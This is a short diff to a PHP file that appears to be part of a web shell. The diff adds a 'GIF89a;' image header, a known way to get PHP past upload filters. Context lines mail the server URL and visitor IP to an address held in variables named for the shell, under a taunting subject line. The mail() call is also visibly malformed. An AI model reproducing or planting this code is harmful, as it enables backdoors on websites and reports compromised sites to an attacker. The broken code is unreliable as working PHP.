@@ -1,3 +1,5 @@
+GIF89a;
+
 <?php
 $head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <meta name="robots" content="noindex">
@@ -21,7 +23,6 @@ $path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($shell_data,to,e, "Halo senpai!!!", $message,$shell_data,$shell, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 ?>
-
 <?php
 $random = rand(1000,5000);
 ?>
